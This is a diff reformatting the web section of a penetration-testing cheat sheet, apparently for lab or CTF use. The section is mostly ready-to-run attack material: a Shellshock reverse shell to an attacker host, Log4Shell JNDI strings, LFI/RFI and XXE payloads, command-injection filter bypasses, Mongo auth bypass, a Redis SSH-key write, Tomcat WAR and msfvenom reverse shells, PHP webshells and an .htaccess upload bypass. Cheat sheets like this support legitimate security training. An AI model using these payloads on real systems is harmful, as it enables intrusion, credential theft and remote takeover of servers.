@@ -84,68 +84,137 @@ nslookup                      # then: server $IP  ->  <domain>
 
 ## Web (80/443/8080/...)
 
+**Fingerprint and content**
 ```bash
 whatweb -a3 http://$IP
 curl -sSik http://$IP/robots.txt
 nmap -p80 --script http-enum,http-title,http-headers,http-methods $IP
+```
 
-# directory brute (pick one). -d 2 stops ferox recursing into a phone book
+**Directory brute** (pick one; `-d 2` stops ferox recursing into a phone book)
+```bash
 feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -d 2 -x php,html,txt -C 404,403
 ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc all -fc 404
 gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+```
 
-# vhost / subdomain fuzz (add <host> to /etc/hosts first)
+**Vhost / subdomain fuzz** (add `<host>` to /etc/hosts first)
+```bash
 ffuf -u http://$IP -H "Host: FUZZ.<host>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <baseline-size>
+```
 
-# WordPress
-curl -s http://$IP/readme.html | grep -i version                 # core version
+**WordPress** — admin panel &rarr; Appearance &rarr; Theme Editor &rarr; 404.php = PHP shell; `wp-config.php` holds the DB creds.
+```bash
+curl -s http://$IP/readme.html | grep -i version
 wpscan --url http://$IP --enumerate ap,at,u,cb,dbe --plugins-detection aggressive --api-token <token>
-cmsmap -f W http://$IP                                            # alt scanner (also J/D/M); -F full, noisy
-curl -s http://$IP/wp-json/wp/v2/users                           # user enum via REST API
-wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt   # login brute
-# admin panel -> Appearance > Theme Editor > 404.php = PHP shell ; wp-config.php holds the DB creds
+cmsmap -f W http://$IP
+curl -s http://$IP/wp-json/wp/v2/users
+wpscan --url http://$IP -U <user> -P /usr/share/wordlists/rockyou.txt
+```
 
-# XXE - any endpoint that parses XML (reads local files)
-# <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
-#   PHP source: file:///... -> php://filter/convert.base64-encode/resource=index.php
+**LFI** — then log-poison or a wrapper to RCE. Read PHP source with `php://filter/convert.base64-encode/resource=index.php`, inline code with `data://`, an uploaded file with `phar://`.
+```bash
+curl --path-as-is "http://$IP/../../../../etc/passwd"
+```
 
-# NoSQL (Mongo) auth bypass / extract
-#   username[$ne]=x&password[$ne]=x        |  username[$regex]=^admin
-# Spring Boot Actuator (Java):  /actuator/env  /actuator/heapdump  /actuator/sessions
-# LFI->RCE wrappers: php://filter/convert.base64-encode/resource=  data://  phar://
-curl --path-as-is "http://$IP/../../../../etc/passwd"   # curl strips ../ without this; matters on loopback services
-# Shellshock (/cgi-bin/*.sh):  User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
-# Log4Shell (any logged field):  ${jndi:ldap://<lhost>/x}     (marshalsec/JNDIExploit for the payload class)
-# GraphQL introspection:  POST /graphql {"query":"{__schema{types{name fields{name}}}}"}   (InQL, graphw00f)
-# Deserialization: Java ysoserial | .NET ysoserial.net ViewState | Python pickle | Node node-serialize
-# WebDAV:  davtest -url http://<ip>   ;  curl -T shell.php http://<ip>/   (upload .txt then MOVE if filtered)
-# writable SMB/FTP share that IS the web root: put shell, then curl it. IIS runs .aspx, Apache .php
-#   msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
-# Jenkins /script (Groovy):  println 'id'.execute().text
-# Redis unauth -> SSH key:  config set dir /var/lib/redis/.ssh ; config set dbfilename authorized_keys ; set x '<pubkey>' ; save
-# Redis as root, nothing to key? module RCE:  module load /tmp/module.so ; system.exec 'id'   (RedisModules-ExecuteCommand)
-# Ghostcat (AJP 8009, CVE-2020-1938):  python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
-# RFI - include takes a URL:  ?page=http://$LHOST/shell.txt
-#   Windows + allow_url_include=Off? UNC still works:  ?page=\\$LHOST\share\shell.php
-#   impacket-smbserver share $(pwd) -smb2support     (use real samba if smbserver drops the connection)
-# cmdi filter bypass: cat${IFS}/etc/passwd | {cat,/etc/passwd} | c\at /etc/pa*wd | echo Y2F0|base64 -d|sh
-# PHP type juggling: password[]=x (array -> NULL == 0) | 0e magic hashes compare equal ('0e12' == '0e99')
-# upload filter blocks .php? teach Apache a new extension instead:
-#   printf 'AddType application/x-httpd-php .zzz\n' > .htaccess   (upload it, then shell.zzz)
-#   php_flag engine on      - re-enables PHP where it was disabled for that folder
-# upload is parsed server-side? hit the parser: exiftool CVE-2021-22204 (DjVu), ImageMagick CVE-2022-44268
-# Jupyter on 8888: New > Terminal is a shell. Token leaks in configs/history/ps
-#   curl -s http://<ip>:8888/api/sessions
+**XXE** — POST it where the app parses XML:
+```xml
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+```
 
-# Tomcat Manager -> WAR shell (defaults: tomcat:tomcat / tomcat:s3cret / admin:admin)
+**NoSQL (Mongo)** — auth bypass, then extract char by char:
+```
+username[$ne]=x&password[$ne]=x
+username[$regex]=^admin
+```
+
+**Command-injection filter bypass**
+```
+cat${IFS}/etc/passwd
+{cat,/etc/passwd}
+c\at /etc/pa*wd
+echo Y2F0|base64 -d|sh
+```
+
+**RFI** — the include takes a URL (Windows + `allow_url_include=Off`? a UNC path still works):
+```
+?page=http://$LHOST/shell.txt
+?page=\\$LHOST\share\shell.php
+```
+```bash
+impacket-smbserver share $(pwd) -smb2support
+```
+
+**PHP type juggling** — `password[]=x` (array &rarr; NULL == 0); `0e` magic hashes compare equal (`'0e12' == '0e99'`).
+
+**Shellshock** (/cgi-bin/*.sh) — put it in a header:
+```
+User-Agent: () { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
+```
+
+**Log4Shell** — spray any logged field; marshalsec / JNDIExploit serves the payload class:
+```
+${jndi:ldap://<lhost>/x}
+```
+
+**GraphQL introspection** (InQL, graphw00f) — POST to /graphql:
+```
+{"query":"{__schema{types{name fields{name}}}}"}
+```
+
+**Deserialization** — a base64 blob in a cookie, parameter or `__VIEWSTATE`: Java `ysoserial` (SnakeYAML &rarr; marshalsec), .NET `ysoserial.net`, Python `pickle`, Node `node-serialize`.
+
+**Spring Boot Actuator** (Java) — then `/actuator/env`, `/actuator/heapdump`, `/actuator/sessions`:
+```bash
+curl -s http://$IP/actuator | jq
+```
+
+**Tomcat Manager &rarr; WAR shell** (defaults tomcat:tomcat / tomcat:s3cret / admin:admin)
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o rev.war
 curl -u tomcat:s3cret -T rev.war "http://$IP:8080/manager/text/deploy?path=/rev"
-curl "http://$IP:8080/rev/"       # listener up first
+curl "http://$IP:8080/rev/"
+```
 
-# PHP shells to upload
-echo '<?php system($_GET["cmd"]); ?>' > cmd.php          # then browse cmd.php?cmd=id
-cp /usr/share/webshells/php/php-reverse-shell.php shell.php   # edit $ip/$port, upload, nc -lvnp <port>, browse it
-msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php  # command-runner, does NOT upgrade to a TTY -- prefer php-reverse-shell.php above
+**Jenkins** — /script Groovy console:
+```
+println 'id'.execute().text
+```
+
+**Redis (unauth)** &rarr; write an SSH key. As root with nothing keyed, module RCE (RedisModules-ExecuteCommand): `module load /tmp/module.so` then `system.exec 'id'`.
+```bash
+redis-cli -h $IP config set dir /var/lib/redis/.ssh
+redis-cli -h $IP config set dbfilename authorized_keys
+redis-cli -h $IP -x set x < key.txt
+redis-cli -h $IP save
+```
+
+**WebDAV** — if `.php` is blocked, upload `.txt` then `MOVE` it:
+```bash
+davtest -url http://$IP
+curl -T shell.php http://$IP/
+```
+
+**Ghostcat** (AJP 8009, CVE-2020-1938)
+```bash
+python3 ajpShooter.py http://$IP:8080 8009 /WEB-INF/web.xml read
+```
+
+**Jupyter on 8888** — New &rarr; Terminal is a shell; the token leaks in configs/history/ps.
+```bash
+curl -s http://$IP:8888/api/sessions
+```
+
+**Upload filter blocks .php?** teach Apache a new extension, then browse `shell.zzz`. Parser-side bugs: exiftool CVE-2021-22204 (DjVu), ImageMagick CVE-2022-44268.
+```bash
+printf 'AddType application/x-httpd-php .zzz\n' > .htaccess
+```
+
+**PHP / ASPX shells to upload** — `msfvenom -p php/reverse_php` is a command-runner and will NOT upgrade to a TTY; prefer `php-reverse-shell.php`.
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > cmd.php
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
 ```
 
 Reminder: if the browser redirects to a name, `echo "$IP <host>" | sudo tee -a /etc/hosts`.
